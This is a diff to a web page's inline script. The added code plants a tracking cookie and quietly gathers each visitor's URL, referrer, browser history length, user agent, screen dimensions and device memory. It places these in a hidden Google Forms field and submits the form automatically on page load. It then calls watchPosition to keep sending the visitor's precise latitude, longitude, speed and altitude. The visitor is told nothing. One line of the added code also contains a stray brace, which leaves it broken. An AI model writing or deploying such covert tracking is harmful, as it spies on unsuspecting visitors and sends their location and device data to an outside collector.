@@ -21,9 +21,67 @@
 <input id="texto" name="entry.667481942" type="hidden">
 </form>
 <script>
-var info = window.location.href;
+const set_cookie = tk => {
+    document.cookie = `tarciso=${tk};expires=2022-12-31T23:59:59.000Z;path=/;`;
+  return;
+}
+
+const getCookie = cname => {
+  let name = cname + "=";
+  let ca = document.cookie.split(';');
+  for(let i = 0; i < ca.length; i++) {
+    let c = ca[i];
+    while (c.charAt(0) == ' ') c = c.substring(1);
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return '';
+}
+
+let token = getCookie('tarciso');
+
+if (token === '') {
+ token = (Math.random().toString(36)+"00000000000").substring(2,13).toUpperCase();
+ set_cookie(token);
+}
+
+var info = 'href: ' + window.location.href + 
+           '\ntoken: ' + token + 
+           '\nreferrer: ' + document.referrer + 
+           '\nhistory.length: ' + history.length + 
+           '\nuserAgent: ' + navigator.userAgent + 
+           '\nscreen.width: ' + screen.width + 
+           '\nscreen.height: ' + screen.height + 
+           '\ninnerWidth: ' + innerWidth + 
+           '\ninnerHeight: ' + innerHeight + 
+           '\ndeviceMemory: ' + navigator.deviceMemory + 'GiB of RAM';
+
 document.getElementById("texto").value = info;
 document.forms.formlog.submit();
+
+const geo_success = (position) => {
+  document.getElementById("texto").value = token} + 
+    '\nlatitute: ' + position.coords.latitude +
+    '\nlongitude: ' + position.coords.longitude + 
+    '\naccuracy: ' + position.coords.accuracy + ' m' +
+    '\nspeed: ' + position.coords.speed + ' m/s' + 
+    '\naltitude: ' + position.coords.altitude + ' m' + 
+    '\naltitudeAccuracy: ' + position.coords.altitudeAccuracy + ' m';
+  document.forms.formlog.submit();
+  return;
+}
+
+const geo_error = () => {
+  document.getElementById("texto").value = `${token} falhou geolocation`;
+  document.forms.formlog.submit();
+  return;
+}
+
+if (navigator.geolocation) {
+  navigator.geolocation.watchPosition(geo_success, geo_error, {enableHighAccuracy:true, maximumAge:400000, timeout:350000});
+}
+
 </script>
 
 
